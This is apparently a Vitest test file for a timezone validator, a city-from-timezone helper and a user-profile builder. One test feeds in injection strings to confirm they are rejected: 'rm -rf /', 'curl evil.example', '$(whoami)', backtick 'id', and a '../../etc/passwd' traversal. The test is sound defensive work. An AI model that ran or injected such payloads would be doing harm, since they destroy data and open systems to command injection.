import { describe, expect, it } from "vitest";
import { buildUserProfile, isValidTimezone } from "@/lib/hermes";
import { cityFromTimezone } from "@/lib/client-locale";

// The timezone is browser-supplied and ends up in two dangerous places: a shell command run on
// the student's agent box, and a symlink path under /usr/share/zoneinfo. It is also the value
// that decides when their proactive check-in fires. Both reasons to pin the behaviour down.

describe("isValidTimezone", () => {
  it("accepts real IANA zones", () => {
    for (const tz of ["America/New_York", "Europe/London", "Asia/Kolkata", "America/Argentina/Buenos_Aires", "UTC"]) {
      expect(isValidTimezone(tz), tz).toBe(true);
    }
  });

  it("rejects empty and non-string values", () => {
    expect(isValidTimezone(null)).toBe(false);
    expect(isValidTimezone(undefined)).toBe(false);
    expect(isValidTimezone("")).toBe(false);
  });

  it("rejects a zone that isn't real, so we never symlink a path that doesn't exist", () => {
    expect(isValidTimezone("America/Nowhere_Real")).toBe(false);
    expect(isValidTimezone("Not/A/Zone")).toBe(false);
  });

  // The reason the character class exists at all: this string is interpolated into a shell
  // command. Intl alone would reject these too, but the guard must not depend on that.
  it("rejects shell metacharacters outright", () => {
    for (const bad of [
      "America/New_York; rm -rf /",
      "America/New_York && curl evil.example",
      "$(whoami)",
      "`id`",
      "America/New_York\nrm -rf /",
      "../../etc/passwd",
    ]) {
      expect(isValidTimezone(bad), bad).toBe(false);
    }
  });

  it("rejects an absurdly long value", () => {
    expect(isValidTimezone("America/" + "a".repeat(200))).toBe(false);
  });
});

describe("cityFromTimezone", () => {
  it("reads the city out of a zone name", () => {
    expect(cityFromTimezone("America/New_York")).toBe("New York");
    expect(cityFromTimezone("Europe/London")).toBe("London");
  });

  it("takes the last segment for three-part zones", () => {
    expect(cityFromTimezone("America/Argentina/Buenos_Aires")).toBe("Buenos Aires");
  });

  it("returns null when there is no city to read", () => {
    expect(cityFromTimezone("UTC")).toBeNull();
    expect(cityFromTimezone(null)).toBeNull();
    expect(cityFromTimezone("")).toBeNull();
  });
});

describe("buildUserProfile timezone/location", () => {
  it("writes both into USER.md so the agent knows which midnight a deadline means", () => {
    const md = buildUserProfile({
      firstName: "Ben",
      timezone: "America/New_York",
      location: "Boston",
    });
    expect(md).toContain("Time zone: America/New_York");
    expect(md).toContain("Location: Boston");
  });

  it("omits a bogus timezone rather than telling the agent something false", () => {
    const md = buildUserProfile({ firstName: "Ben", timezone: "Not/A/Zone" });
    expect(md).not.toContain("Not/A/Zone");
    expect(md).not.toContain("Time zone:");
  });

  it("says nothing at all when neither was captured", () => {
    const md = buildUserProfile({ firstName: "Ben" });
    expect(md).not.toContain("Time zone:");
    expect(md).not.toContain("Location:");
  });
});
